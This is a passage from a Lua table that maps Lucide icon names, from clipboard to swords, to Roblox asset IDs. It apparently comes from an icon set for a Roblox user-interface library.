		["lucide-clipboard-list"] = "rbxassetid://10709798792",
		["lucide-clipboard-signature"] = "rbxassetid://10709798890",
		["lucide-clipboard-type"] = "rbxassetid://10709798999",
		["lucide-clipboard-x"] = "rbxassetid://10709799124",
		["lucide-clock"] = "rbxassetid://10709805144",
		["lucide-clock-1"] = "rbxassetid://10709799535",
		["lucide-clock-10"] = "rbxassetid://10709799718",
		["lucide-clock-11"] = "rbxassetid://10709799818",
		["lucide-clock-12"] = "rbxassetid://10709799962",
		["lucide-clock-2"] = "rbxassetid://10709803876",
		["lucide-clock-3"] = "rbxassetid://10709803989",
		["lucide-clock-4"] = "rbxassetid://10709804164",
		["lucide-clock-5"] = "rbxassetid://10709804291",
		["lucide-clock-6"] = "rbxassetid://10709804435",
		["lucide-clock-7"] = "rbxassetid://10709804599",
		["lucide-clock-8"] = "rbxassetid://10709804784",
		["lucide-clock-9"] = "rbxassetid://10709804996",
		["lucide-cloud"] = "rbxassetid://10709806740",
		["lucide-cloud-cog"] = "rbxassetid://10709805262",
		["lucide-cloud-drizzle"] = "rbxassetid://10709805371",
		["lucide-cloud-fog"] = "rbxassetid://10709805477",
		["lucide-cloud-hail"] = "rbxassetid://10709805596",
		["lucide-cloud-lightning"] = "rbxassetid://10709805727",
		["lucide-cloud-moon"] = "rbxassetid://10709805942",
		["lucide-cloud-moon-rain"] = "rbxassetid://10709805838",
		["lucide-cloud-off"] = "rbxassetid://10709806060",
		["lucide-cloud-rain"] = "rbxassetid://10709806277",
		["lucide-cloud-rain-wind"] = "rbxassetid://10709806166",
		["lucide-cloud-snow"] = "rbxassetid://10709806374",
		["lucide-cloud-sun"] = "rbxassetid://10709806631",
		["lucide-cloud-sun-rain"] = "rbxassetid://10709806475",
		["lucide-cloudy"] = "rbxassetid://10709806859",
		["lucide-clover"] = "rbxassetid://10709806995",
		["lucide-code"] = "rbxassetid://10709810463",
		["lucide-code-2"] = "rbxassetid://10709807111",
		["lucide-codepen"] = "rbxassetid://10709810534",
		["lucide-codesandbox"] = "rbxassetid://10709810676",
		["lucide-coffee"] = "rbxassetid://10709810814",
		["lucide-cog"] = "rbxassetid://10709810948",
		["lucide-coins"] = "rbxassetid://10709811110",
		["lucide-columns"] = "rbxassetid://10709811261",
		["lucide-command"] = "rbxassetid://10709811365",
		["lucide-compass"] = "rbxassetid://10709811445",
		["lucide-component"] = "rbxassetid://10709811595",
		["lucide-concierge-bell"] = "rbxassetid://10709811706",
		["lucide-connection"] = "rbxassetid://10747361219",
		["lucide-contact"] = "rbxassetid://10709811834",
		["lucide-contrast"] = "rbxassetid://10709811939",
		["lucide-cookie"] = "rbxassetid://10709812067",
		["lucide-copy"] = "rbxassetid://10709812159",
		["lucide-copyleft"] = "rbxassetid://10709812251",
		["lucide-copyright"] = "rbxassetid://10709812311",
		["lucide-corner-down-left"] = "rbxassetid://10709812396",
		["lucide-corner-down-right"] = "rbxassetid://10709812485",
		["lucide-corner-left-down"] = "rbxassetid://10709812632",
		["lucide-corner-left-up"] = "rbxassetid://10709812784",
		["lucide-corner-right-down"] = "rbxassetid://10709812939",
		["lucide-corner-right-up"] = "rbxassetid://10709813094",
		["lucide-corner-up-left"] = "rbxassetid://10709813185",
		["lucide-corner-up-right"] = "rbxassetid://10709813281",
		["lucide-cpu"] = "rbxassetid://10709813383",
		["lucide-croissant"] = "rbxassetid://10709818125",
		["lucide-crop"] = "rbxassetid://10709818245",
		["lucide-cross"] = "rbxassetid://10709818399",
		["lucide-crosshair"] = "rbxassetid://10709818534",
		["lucide-crown"] = "rbxassetid://10709818626",
		["lucide-cup-soda"] = "rbxassetid://10709818763",
		["lucide-curly-braces"] = "rbxassetid://10709818847",
		["lucide-currency"] = "rbxassetid://10709818931",
		["lucide-database"] = "rbxassetid://10709818996",
		["lucide-delete"] = "rbxassetid://10709819059",
		["lucide-diamond"] = "rbxassetid://10709819149",
		["lucide-dice-1"] = "rbxassetid://10709819266",
		["lucide-dice-2"] = "rbxassetid://10709819361",
		["lucide-dice-3"] = "rbxassetid://10709819508",
		["lucide-dice-4"] = "rbxassetid://10709819670",
		["lucide-dice-5"] = "rbxassetid://10709819801",
		["lucide-dice-6"] = "rbxassetid://10709819896",
		["lucide-dices"] = "rbxassetid://10723343321",
		["lucide-diff"] = "rbxassetid://10723343416",
		["lucide-disc"] = "rbxassetid://10723343537",
		["lucide-divide"] = "rbxassetid://10723343805",
		["lucide-divide-circle"] = "rbxassetid://10723343636",
		["lucide-divide-square"] = "rbxassetid://10723343737",
		["lucide-dollar-sign"] = "rbxassetid://10723343958",
		["lucide-download"] = "rbxassetid://10723344270",
		["lucide-download-cloud"] = "rbxassetid://10723344088",
		["lucide-droplet"] = "rbxassetid://10723344432",
		["lucide-droplets"] = "rbxassetid://10734883356",
		["lucide-drumstick"] = "rbxassetid://10723344737",
		["lucide-edit"] = "rbxassetid://10734883598",
		["lucide-edit-2"] = "rbxassetid://10723344885",
		["lucide-edit-3"] = "rbxassetid://10723345088",
		["lucide-egg"] = "rbxassetid://10723345518",
		["lucide-egg-fried"] = "rbxassetid://10723345347",
		["lucide-electricity"] = "rbxassetid://10723345749",
		["lucide-electricity-off"] = "rbxassetid://10723345643",
		["lucide-equal"] = "rbxassetid://10723345990",
		["lucide-equal-not"] = "rbxassetid://10723345866",
		["lucide-eraser"] = "rbxassetid://10723346158",
		["lucide-euro"] = "rbxassetid://10723346372",
		["lucide-expand"] = "rbxassetid://10723346553",
		["lucide-external-link"] = "rbxassetid://10723346684",
		["lucide-eye"] = "rbxassetid://10723346959",
		["lucide-eye-off"] = "rbxassetid://10723346871",
		["lucide-factory"] = "rbxassetid://10723347051",
		["lucide-fan"] = "rbxassetid://10723354359",
		["lucide-fast-forward"] = "rbxassetid://10723354521",
		["lucide-feather"] = "rbxassetid://10723354671",
		["lucide-figma"] = "rbxassetid://10723354801",
		["lucide-file"] = "rbxassetid://10723374641",
		["lucide-file-archive"] = "rbxassetid://10723354921",
		["lucide-file-audio"] = "rbxassetid://10723355148",
		["lucide-file-audio-2"] = "rbxassetid://10723355026",
		["lucide-file-axis-3d"] = "rbxassetid://10723355272",
		["lucide-file-badge"] = "rbxassetid://10723355622",
		["lucide-file-badge-2"] = "rbxassetid://10723355451",
		["lucide-file-bar-chart"] = "rbxassetid://10723355887",
		["lucide-file-bar-chart-2"] = "rbxassetid://10723355746",
		["lucide-file-box"] = "rbxassetid://10723355989",
		["lucide-file-check"] = "rbxassetid://10723356210",
		["lucide-file-check-2"] = "rbxassetid://10723356100",
		["lucide-file-clock"] = "rbxassetid://10723356329",
		["lucide-file-code"] = "rbxassetid://10723356507",
		["lucide-file-cog"] = "rbxassetid://10723356830",
		["lucide-file-cog-2"] = "rbxassetid://10723356676",
		["lucide-file-diff"] = "rbxassetid://10723357039",
		["lucide-file-digit"] = "rbxassetid://10723357151",
		["lucide-file-down"] = "rbxassetid://10723357322",
		["lucide-file-edit"] = "rbxassetid://10723357495",
		["lucide-file-heart"] = "rbxassetid://10723357637",
		["lucide-file-image"] = "rbxassetid://10723357790",
		["lucide-file-input"] = "rbxassetid://10723357933",
		["lucide-file-json"] = "rbxassetid://10723364435",
		["lucide-file-json-2"] = "rbxassetid://10723364361",
		["lucide-file-key"] = "rbxassetid://10723364605",
		["lucide-file-key-2"] = "rbxassetid://10723364515",
		["lucide-file-line-chart"] = "rbxassetid://10723364725",
		["lucide-file-lock"] = "rbxassetid://10723364957",
		["lucide-file-lock-2"] = "rbxassetid://10723364861",
		["lucide-file-minus"] = "rbxassetid://10723365254",
		["lucide-file-minus-2"] = "rbxassetid://10723365086",
		["lucide-file-output"] = "rbxassetid://10723365457",
		["lucide-file-pie-chart"] = "rbxassetid://10723365598",
		["lucide-file-plus"] = "rbxassetid://10723365877",
		["lucide-file-plus-2"] = "rbxassetid://10723365766",
		["lucide-file-question"] = "rbxassetid://10723365987",
		["lucide-file-scan"] = "rbxassetid://10723366167",
		["lucide-file-search"] = "rbxassetid://10723366550",
		["lucide-file-search-2"] = "rbxassetid://10723366340",
		["lucide-file-signature"] = "rbxassetid://10723366741",
		["lucide-file-spreadsheet"] = "rbxassetid://10723366962",
		["lucide-file-symlink"] = "rbxassetid://10723367098",
		["lucide-file-terminal"] = "rbxassetid://10723367244",
		["lucide-file-text"] = "rbxassetid://10723367380",
		["lucide-file-type"] = "rbxassetid://10723367606",
		["lucide-file-type-2"] = "rbxassetid://10723367509",
		["lucide-file-up"] = "rbxassetid://10723367734",
		["lucide-file-video"] = "rbxassetid://10723373884",
		["lucide-file-video-2"] = "rbxassetid://10723367834",
		["lucide-file-volume"] = "rbxassetid://10723374172",
		["lucide-file-volume-2"] = "rbxassetid://10723374030",
		["lucide-file-warning"] = "rbxassetid://10723374276",
		["lucide-file-x"] = "rbxassetid://10723374544",
		["lucide-file-x-2"] = "rbxassetid://10723374378",
		["lucide-files"] = "rbxassetid://10723374759",
		["lucide-film"] = "rbxassetid://10723374981",
		["lucide-filter"] = "rbxassetid://10723375128",
		["lucide-fingerprint"] = "rbxassetid://10723375250",
		["lucide-flag"] = "rbxassetid://10723375890",
		["lucide-flag-off"] = "rbxassetid://10723375443",
		["lucide-flag-triangle-left"] = "rbxassetid://10723375608",
		["lucide-flag-triangle-right"] = "rbxassetid://10723375727",
		["lucide-flame"] = "rbxassetid://10723376114",
		["lucide-flashlight"] = "rbxassetid://10723376471",
		["lucide-flashlight-off"] = "rbxassetid://10723376365",
		["lucide-flask-conical"] = "rbxassetid://10734883986",
		["lucide-flask-round"] = "rbxassetid://10723376614",
		["lucide-flip-horizontal"] = "rbxassetid://10723376884",
		["lucide-flip-horizontal-2"] = "rbxassetid://10723376745",
		["lucide-flip-vertical"] = "rbxassetid://10723377138",
		["lucide-flip-vertical-2"] = "rbxassetid://10723377026",
		["lucide-flower"] = "rbxassetid://10747830374",
		["lucide-flower-2"] = "rbxassetid://10723377305",
		["lucide-focus"] = "rbxassetid://10723377537",
		["lucide-folder"] = "rbxassetid://10723387563",
		["lucide-folder-archive"] = "rbxassetid://10723384478",
		["lucide-folder-check"] = "rbxassetid://10723384605",
		["lucide-folder-clock"] = "rbxassetid://10723384731",
		["lucide-folder-closed"] = "rbxassetid://10723384893",
		["lucide-folder-cog"] = "rbxassetid://10723385213",
		["lucide-folder-cog-2"] = "rbxassetid://10723385036",
		["lucide-folder-down"] = "rbxassetid://10723385338",
		["lucide-folder-edit"] = "rbxassetid://10723385445",
		["lucide-folder-heart"] = "rbxassetid://10723385545",
		["lucide-folder-input"] = "rbxassetid://10723385721",
		["lucide-folder-key"] = "rbxassetid://10723385848",
		["lucide-folder-lock"] = "rbxassetid://10723386005",
		["lucide-folder-minus"] = "rbxassetid://10723386127",
		["lucide-folder-open"] = "rbxassetid://10723386277",
		["lucide-folder-output"] = "rbxassetid://10723386386",
		["lucide-folder-plus"] = "rbxassetid://10723386531",
		["lucide-folder-search"] = "rbxassetid://10723386787",
		["lucide-folder-search-2"] = "rbxassetid://10723386674",
		["lucide-folder-symlink"] = "rbxassetid://10723386930",
		["lucide-folder-tree"] = "rbxassetid://10723387085",
		["lucide-folder-up"] = "rbxassetid://10723387265",
		["lucide-folder-x"] = "rbxassetid://10723387448",
		["lucide-folders"] = "rbxassetid://10723387721",
		["lucide-form-input"] = "rbxassetid://10723387841",
		["lucide-forward"] = "rbxassetid://10723388016",
		["lucide-frame"] = "rbxassetid://10723394389",
		["lucide-framer"] = "rbxassetid://10723394565",
		["lucide-frown"] = "rbxassetid://10723394681",
		["lucide-fuel"] = "rbxassetid://10723394846",
		["lucide-function-square"] = "rbxassetid://10723395041",
		["lucide-gamepad"] = "rbxassetid://10723395457",
		["lucide-gamepad-2"] = "rbxassetid://10723395215",
		["lucide-gauge"] = "rbxassetid://10723395708",
		["lucide-gavel"] = "rbxassetid://10723395896",
		["lucide-gem"] = "rbxassetid://10723396000",
		["lucide-ghost"] = "rbxassetid://10723396107",
		["lucide-gift"] = "rbxassetid://10723396402",
		["lucide-gift-card"] = "rbxassetid://10723396225",
		["lucide-git-branch"] = "rbxassetid://10723396676",
		["lucide-git-branch-plus"] = "rbxassetid://10723396542",
		["lucide-git-commit"] = "rbxassetid://10723396812",
		["lucide-git-compare"] = "rbxassetid://10723396954",
		["lucide-git-fork"] = "rbxassetid://10723397049",
		["lucide-git-merge"] = "rbxassetid://10723397165",
		["lucide-git-pull-request"] = "rbxassetid://10723397431",
		["lucide-git-pull-request-closed"] = "rbxassetid://10723397268",
		["lucide-git-pull-request-draft"] = "rbxassetid://10734884302",
		["lucide-glass"] = "rbxassetid://10723397788",
		["lucide-glass-2"] = "rbxassetid://10723397529",
		["lucide-glass-water"] = "rbxassetid://10723397678",
		["lucide-glasses"] = "rbxassetid://10723397895",
		["lucide-globe"] = "rbxassetid://10723404337",
		["lucide-globe-2"] = "rbxassetid://10723398002",
		["lucide-grab"] = "rbxassetid://10723404472",
		["lucide-graduation-cap"] = "rbxassetid://10723404691",
		["lucide-grape"] = "rbxassetid://10723404822",
		["lucide-grid"] = "rbxassetid://10723404936",
		["lucide-grip-horizontal"] = "rbxassetid://10723405089",
		["lucide-grip-vertical"] = "rbxassetid://10723405236",
		["lucide-hammer"] = "rbxassetid://10723405360",
		["lucide-hand"] = "rbxassetid://10723405649",
		["lucide-hand-metal"] = "rbxassetid://10723405508",
		["lucide-hard-drive"] = "rbxassetid://10723405749",
		["lucide-hard-hat"] = "rbxassetid://10723405859",
		["lucide-hash"] = "rbxassetid://10723405975",
		["lucide-haze"] = "rbxassetid://10723406078",
		["lucide-headphones"] = "rbxassetid://10723406165",
		["lucide-heart"] = "rbxassetid://10723406885",
		["lucide-heart-crack"] = "rbxassetid://10723406299",
		["lucide-heart-handshake"] = "rbxassetid://10723406480",
		["lucide-heart-off"] = "rbxassetid://10723406662",
		["lucide-heart-pulse"] = "rbxassetid://10723406795",
		["lucide-help-circle"] = "rbxassetid://10723406988",
		["lucide-hexagon"] = "rbxassetid://10723407092",
		["lucide-highlighter"] = "rbxassetid://10723407192",
		["lucide-history"] = "rbxassetid://10723407335",
		["lucide-home"] = "rbxassetid://10723407389",
		["lucide-hourglass"] = "rbxassetid://10723407498",
		["lucide-ice-cream"] = "rbxassetid://10723414308",
		["lucide-image"] = "rbxassetid://10723415040",
		["lucide-image-minus"] = "rbxassetid://10723414487",
		["lucide-image-off"] = "rbxassetid://10723414677",
		["lucide-image-plus"] = "rbxassetid://10723414827",
		["lucide-import"] = "rbxassetid://10723415205",
		["lucide-inbox"] = "rbxassetid://10723415335",
		["lucide-indent"] = "rbxassetid://10723415494",
		["lucide-indian-rupee"] = "rbxassetid://10723415642",
		["lucide-infinity"] = "rbxassetid://10723415766",
		["lucide-info"] = "rbxassetid://10723415903",
		["lucide-inspect"] = "rbxassetid://10723416057",
		["lucide-italic"] = "rbxassetid://10723416195",
		["lucide-japanese-yen"] = "rbxassetid://10723416363",
		["lucide-joystick"] = "rbxassetid://10723416527",
		["lucide-key"] = "rbxassetid://10723416652",
		["lucide-keyboard"] = "rbxassetid://10723416765",
		["lucide-lamp"] = "rbxassetid://10723417513",
		["lucide-lamp-ceiling"] = "rbxassetid://10723416922",
		["lucide-lamp-desk"] = "rbxassetid://10723417016",
		["lucide-lamp-floor"] = "rbxassetid://10723417131",
		["lucide-lamp-wall-down"] = "rbxassetid://10723417240",
		["lucide-lamp-wall-up"] = "rbxassetid://10723417356",
		["lucide-landmark"] = "rbxassetid://10723417608",
		["lucide-languages"] = "rbxassetid://10723417703",
		["lucide-laptop"] = "rbxassetid://10723423881",
		["lucide-laptop-2"] = "rbxassetid://10723417797",
		["lucide-lasso"] = "rbxassetid://10723424235",
		["lucide-lasso-select"] = "rbxassetid://10723424058",
		["lucide-laugh"] = "rbxassetid://10723424372",
		["lucide-layers"] = "rbxassetid://10723424505",
		["lucide-layout"] = "rbxassetid://10723425376",
		["lucide-layout-dashboard"] = "rbxassetid://10723424646",
		["lucide-layout-grid"] = "rbxassetid://10723424838",
		["lucide-layout-list"] = "rbxassetid://10723424963",
		["lucide-layout-template"] = "rbxassetid://10723425187",
		["lucide-leaf"] = "rbxassetid://10723425539",
		["lucide-library"] = "rbxassetid://10723425615",
		["lucide-life-buoy"] = "rbxassetid://10723425685",
		["lucide-lightbulb"] = "rbxassetid://10723425852",
		["lucide-lightbulb-off"] = "rbxassetid://10723425762",
		["lucide-line-chart"] = "rbxassetid://10723426393",
		["lucide-link"] = "rbxassetid://10723426722",
		["lucide-link-2"] = "rbxassetid://10723426595",
		["lucide-link-2-off"] = "rbxassetid://10723426513",
		["lucide-list"] = "rbxassetid://10723433811",
		["lucide-list-checks"] = "rbxassetid://10734884548",
		["lucide-list-end"] = "rbxassetid://10723426886",
		["lucide-list-minus"] = "rbxassetid://10723426986",
		["lucide-list-music"] = "rbxassetid://10723427081",
		["lucide-list-ordered"] = "rbxassetid://10723427199",
		["lucide-list-plus"] = "rbxassetid://10723427334",
		["lucide-list-start"] = "rbxassetid://10723427494",
		["lucide-list-video"] = "rbxassetid://10723427619",
		["lucide-list-x"] = "rbxassetid://10723433655",
		["lucide-loader"] = "rbxassetid://10723434070",
		["lucide-loader-2"] = "rbxassetid://10723433935",
		["lucide-locate"] = "rbxassetid://10723434557",
		["lucide-locate-fixed"] = "rbxassetid://10723434236",
		["lucide-locate-off"] = "rbxassetid://10723434379",
		["lucide-lock"] = "rbxassetid://10723434711",
		["lucide-log-in"] = "rbxassetid://10723434830",
		["lucide-log-out"] = "rbxassetid://10723434906",
		["lucide-luggage"] = "rbxassetid://10723434993",
		["lucide-magnet"] = "rbxassetid://10723435069",
		["lucide-mail"] = "rbxassetid://10734885430",
		["lucide-mail-check"] = "rbxassetid://10723435182",
		["lucide-mail-minus"] = "rbxassetid://10723435261",
		["lucide-mail-open"] = "rbxassetid://10723435342",
		["lucide-mail-plus"] = "rbxassetid://10723435443",
		["lucide-mail-question"] = "rbxassetid://10723435515",
		["lucide-mail-search"] = "rbxassetid://10734884739",
		["lucide-mail-warning"] = "rbxassetid://10734885015",
		["lucide-mail-x"] = "rbxassetid://10734885247",
		["lucide-mails"] = "rbxassetid://10734885614",
		["lucide-map"] = "rbxassetid://10734886202",
		["lucide-map-pin"] = "rbxassetid://10734886004",
		["lucide-map-pin-off"] = "rbxassetid://10734885803",
		["lucide-maximize"] = "rbxassetid://10734886735",
		["lucide-maximize-2"] = "rbxassetid://10734886496",
		["lucide-medal"] = "rbxassetid://10734887072",
		["lucide-megaphone"] = "rbxassetid://10734887454",
		["lucide-megaphone-off"] = "rbxassetid://10734887311",
		["lucide-meh"] = "rbxassetid://10734887603",
		["lucide-menu"] = "rbxassetid://10734887784",
		["lucide-message-circle"] = "rbxassetid://10734888000",
		["lucide-message-square"] = "rbxassetid://10734888228",
		["lucide-mic"] = "rbxassetid://10734888864",
		["lucide-mic-2"] = "rbxassetid://10734888430",
		["lucide-mic-off"] = "rbxassetid://10734888646",
		["lucide-microscope"] = "rbxassetid://10734889106",
		["lucide-microwave"] = "rbxassetid://10734895076",
		["lucide-milestone"] = "rbxassetid://10734895310",
		["lucide-minimize"] = "rbxassetid://10734895698",
		["lucide-minimize-2"] = "rbxassetid://10734895530",
		["lucide-minus"] = "rbxassetid://10734896206",
		["lucide-minus-circle"] = "rbxassetid://10734895856",
		["lucide-minus-square"] = "rbxassetid://10734896029",
		["lucide-monitor"] = "rbxassetid://10734896881",
		["lucide-monitor-off"] = "rbxassetid://10734896360",
		["lucide-monitor-speaker"] = "rbxassetid://10734896512",
		["lucide-moon"] = "rbxassetid://10734897102",
		["lucide-more-horizontal"] = "rbxassetid://10734897250",
		["lucide-more-vertical"] = "rbxassetid://10734897387",
		["lucide-mountain"] = "rbxassetid://10734897956",
		["lucide-mountain-snow"] = "rbxassetid://10734897665",
		["lucide-mouse"] = "rbxassetid://10734898592",
		["lucide-mouse-pointer"] = "rbxassetid://10734898476",
		["lucide-mouse-pointer-2"] = "rbxassetid://10734898194",
		["lucide-mouse-pointer-click"] = "rbxassetid://10734898355",
		["lucide-move"] = "rbxassetid://10734900011",
		["lucide-move-3d"] = "rbxassetid://10734898756",
		["lucide-move-diagonal"] = "rbxassetid://10734899164",
		["lucide-move-diagonal-2"] = "rbxassetid://10734898934",
		["lucide-move-horizontal"] = "rbxassetid://10734899414",
		["lucide-move-vertical"] = "rbxassetid://10734899821",
		["lucide-music"] = "rbxassetid://10734905958",
		["lucide-music-2"] = "rbxassetid://10734900215",
		["lucide-music-3"] = "rbxassetid://10734905665",
		["lucide-music-4"] = "rbxassetid://10734905823",
		["lucide-navigation"] = "rbxassetid://10734906744",
		["lucide-navigation-2"] = "rbxassetid://10734906332",
		["lucide-navigation-2-off"] = "rbxassetid://10734906144",
		["lucide-navigation-off"] = "rbxassetid://10734906580",
		["lucide-network"] = "rbxassetid://10734906975",
		["lucide-newspaper"] = "rbxassetid://10734907168",
		["lucide-octagon"] = "rbxassetid://10734907361",
		["lucide-option"] = "rbxassetid://10734907649",
		["lucide-outdent"] = "rbxassetid://10734907933",
		["lucide-package"] = "rbxassetid://10734909540",
		["lucide-package-2"] = "rbxassetid://10734908151",
		["lucide-package-check"] = "rbxassetid://10734908384",
		["lucide-package-minus"] = "rbxassetid://10734908626",
		["lucide-package-open"] = "rbxassetid://10734908793",
		["lucide-package-plus"] = "rbxassetid://10734909016",
		["lucide-package-search"] = "rbxassetid://10734909196",
		["lucide-package-x"] = "rbxassetid://10734909375",
		["lucide-paint-bucket"] = "rbxassetid://10734909847",
		["lucide-paintbrush"] = "rbxassetid://10734910187",
		["lucide-paintbrush-2"] = "rbxassetid://10734910030",
		["lucide-palette"] = "rbxassetid://10734910430",
		["lucide-palmtree"] = "rbxassetid://10734910680",
		["lucide-paperclip"] = "rbxassetid://10734910927",
		["lucide-party-popper"] = "rbxassetid://10734918735",
		["lucide-pause"] = "rbxassetid://10734919336",
		["lucide-pause-circle"] = "rbxassetid://10735024209",
		["lucide-pause-octagon"] = "rbxassetid://10734919143",
		["lucide-pen-tool"] = "rbxassetid://10734919503",
		["lucide-pencil"] = "rbxassetid://10734919691",
		["lucide-percent"] = "rbxassetid://10734919919",
		["lucide-person-standing"] = "rbxassetid://10734920149",
		["lucide-phone"] = "rbxassetid://10734921524",
		["lucide-phone-call"] = "rbxassetid://10734920305",
		["lucide-phone-forwarded"] = "rbxassetid://10734920508",
		["lucide-phone-incoming"] = "rbxassetid://10734920694",
		["lucide-phone-missed"] = "rbxassetid://10734920845",
		["lucide-phone-off"] = "rbxassetid://10734921077",
		["lucide-phone-outgoing"] = "rbxassetid://10734921288",
		["lucide-pie-chart"] = "rbxassetid://10734921727",
		["lucide-piggy-bank"] = "rbxassetid://10734921935",
		["lucide-pin"] = "rbxassetid://10734922324",
		["lucide-pin-off"] = "rbxassetid://10734922180",
		["lucide-pipette"] = "rbxassetid://10734922497",
		["lucide-pizza"] = "rbxassetid://10734922774",
		["lucide-plane"] = "rbxassetid://10734922971",
		["lucide-play"] = "rbxassetid://10734923549",
		["lucide-play-circle"] = "rbxassetid://10734923214",
		["lucide-plus"] = "rbxassetid://10734924532",
		["lucide-plus-circle"] = "rbxassetid://10734923868",
		["lucide-plus-square"] = "rbxassetid://10734924219",
		["lucide-podcast"] = "rbxassetid://10734929553",
		["lucide-pointer"] = "rbxassetid://10734929723",
		["lucide-pound-sterling"] = "rbxassetid://10734929981",
		["lucide-power"] = "rbxassetid://10734930466",
		["lucide-power-off"] = "rbxassetid://10734930257",
		["lucide-printer"] = "rbxassetid://10734930632",
		["lucide-puzzle"] = "rbxassetid://10734930886",
		["lucide-quote"] = "rbxassetid://10734931234",
		["lucide-radio"] = "rbxassetid://10734931596",
		["lucide-radio-receiver"] = "rbxassetid://10734931402",
		["lucide-rectangle-horizontal"] = "rbxassetid://10734931777",
		["lucide-rectangle-vertical"] = "rbxassetid://10734932081",
		["lucide-recycle"] = "rbxassetid://10734932295",
		["lucide-redo"] = "rbxassetid://10734932822",
		["lucide-redo-2"] = "rbxassetid://10734932586",
		["lucide-refresh-ccw"] = "rbxassetid://10734933056",
		["lucide-refresh-cw"] = "rbxassetid://10734933222",
		["lucide-refrigerator"] = "rbxassetid://10734933465",
		["lucide-regex"] = "rbxassetid://10734933655",
		["lucide-repeat"] = "rbxassetid://10734933966",
		["lucide-repeat-1"] = "rbxassetid://10734933826",
		["lucide-reply"] = "rbxassetid://10734934252",
		["lucide-reply-all"] = "rbxassetid://10734934132",
		["lucide-rewind"] = "rbxassetid://10734934347",
		["lucide-rocket"] = "rbxassetid://10734934585",
		["lucide-rocking-chair"] = "rbxassetid://10734939942",
		["lucide-rotate-3d"] = "rbxassetid://10734940107",
		["lucide-rotate-ccw"] = "rbxassetid://10734940376",
		["lucide-rotate-cw"] = "rbxassetid://10734940654",
		["lucide-rss"] = "rbxassetid://10734940825",
		["lucide-ruler"] = "rbxassetid://10734941018",
		["lucide-russian-ruble"] = "rbxassetid://10734941199",
		["lucide-sailboat"] = "rbxassetid://10734941284",
		["lucide-save"] = "rbxassetid://10734941499",
		["lucide-scale"] = "rbxassetid://10734941912",
		["lucide-scale-3d"] = "rbxassetid://10734941739",
		["lucide-scaling"] = "rbxassetid://10734942072",
		["lucide-scan"] = "rbxassetid://10734942565",
		["lucide-scan-face"] = "rbxassetid://10734942198",
		["lucide-scan-line"] = "rbxassetid://10734942351",
		["lucide-scissors"] = "rbxassetid://10734942778",
		["lucide-screen-share"] = "rbxassetid://10734943193",
		["lucide-screen-share-off"] = "rbxassetid://10734942967",
		["lucide-scroll"] = "rbxassetid://10734943448",
		["lucide-search"] = "rbxassetid://10734943674",
		["lucide-send"] = "rbxassetid://10734943902",
		["lucide-separator-horizontal"] = "rbxassetid://10734944115",
		["lucide-separator-vertical"] = "rbxassetid://10734944326",
		["lucide-server"] = "rbxassetid://10734949856",
		["lucide-server-cog"] = "rbxassetid://10734944444",
		["lucide-server-crash"] = "rbxassetid://10734944554",
		["lucide-server-off"] = "rbxassetid://10734944668",
		["lucide-settings"] = "rbxassetid://10734950309",
		["lucide-settings-2"] = "rbxassetid://10734950020",
		["lucide-share"] = "rbxassetid://10734950813",
		["lucide-share-2"] = "rbxassetid://10734950553",
		["lucide-sheet"] = "rbxassetid://10734951038",
		["lucide-shield"] = "rbxassetid://10734951847",
		["lucide-shield-alert"] = "rbxassetid://10734951173",
		["lucide-shield-check"] = "rbxassetid://10734951367",
		["lucide-shield-close"] = "rbxassetid://10734951535",
		["lucide-shield-off"] = "rbxassetid://10734951684",
		["lucide-shirt"] = "rbxassetid://10734952036",
		["lucide-shopping-bag"] = "rbxassetid://10734952273",
		["lucide-shopping-cart"] = "rbxassetid://10734952479",
		["lucide-shovel"] = "rbxassetid://10734952773",
		["lucide-shower-head"] = "rbxassetid://10734952942",
		["lucide-shrink"] = "rbxassetid://10734953073",
		["lucide-shrub"] = "rbxassetid://10734953241",
		["lucide-shuffle"] = "rbxassetid://10734953451",
		["lucide-sidebar"] = "rbxassetid://10734954301",
		["lucide-sidebar-close"] = "rbxassetid://10734953715",
		["lucide-sidebar-open"] = "rbxassetid://10734954000",
		["lucide-sigma"] = "rbxassetid://10734954538",
		["lucide-signal"] = "rbxassetid://10734961133",
		["lucide-signal-high"] = "rbxassetid://10734954807",
		["lucide-signal-low"] = "rbxassetid://10734955080",
		["lucide-signal-medium"] = "rbxassetid://10734955336",
		["lucide-signal-zero"] = "rbxassetid://10734960878",
		["lucide-siren"] = "rbxassetid://10734961284",
		["lucide-skip-back"] = "rbxassetid://10734961526",
		["lucide-skip-forward"] = "rbxassetid://10734961809",
		["lucide-skull"] = "rbxassetid://10734962068",
		["lucide-slack"] = "rbxassetid://10734962339",
		["lucide-slash"] = "rbxassetid://10734962600",
		["lucide-slice"] = "rbxassetid://10734963024",
		["lucide-sliders"] = "rbxassetid://10734963400",
		["lucide-sliders-horizontal"] = "rbxassetid://10734963191",
		["lucide-smartphone"] = "rbxassetid://10734963940",
		["lucide-smartphone-charging"] = "rbxassetid://10734963671",
		["lucide-smile"] = "rbxassetid://10734964441",
		["lucide-smile-plus"] = "rbxassetid://10734964188",
		["lucide-snowflake"] = "rbxassetid://10734964600",
		["lucide-sofa"] = "rbxassetid://10734964852",
		["lucide-sort-asc"] = "rbxassetid://10734965115",
		["lucide-sort-desc"] = "rbxassetid://10734965287",
		["lucide-speaker"] = "rbxassetid://10734965419",
		["lucide-sprout"] = "rbxassetid://10734965572",
		["lucide-square"] = "rbxassetid://10734965702",
		["lucide-star"] = "rbxassetid://10734966248",
		["lucide-star-half"] = "rbxassetid://10734965897",
		["lucide-star-off"] = "rbxassetid://10734966097",
		["lucide-stethoscope"] = "rbxassetid://10734966384",
		["lucide-sticker"] = "rbxassetid://10734972234",
		["lucide-sticky-note"] = "rbxassetid://10734972463",
		["lucide-stop-circle"] = "rbxassetid://10734972621",
		["lucide-stretch-horizontal"] = "rbxassetid://10734972862",
		["lucide-stretch-vertical"] = "rbxassetid://10734973130",
		["lucide-strikethrough"] = "rbxassetid://10734973290",
		["lucide-subscript"] = "rbxassetid://10734973457",
		["lucide-sun"] = "rbxassetid://10734974297",
		["lucide-sun-dim"] = "rbxassetid://10734973645",
		["lucide-sun-medium"] = "rbxassetid://10734973778",
		["lucide-sun-moon"] = "rbxassetid://10734973999",
		["lucide-sun-snow"] = "rbxassetid://10734974130",
		["lucide-sunrise"] = "rbxassetid://10734974522",
		["lucide-sunset"] = "rbxassetid://10734974689",
		["lucide-superscript"] = "rbxassetid://10734974850",
		["lucide-swiss-franc"] = "rbxassetid://10734975024",
		["lucide-switch-camera"] = "rbxassetid://10734975214",
		["lucide-sword"] = "rbxassetid://10734975486",
		["lucide-swords"] = "rbxassetid://10734975692",
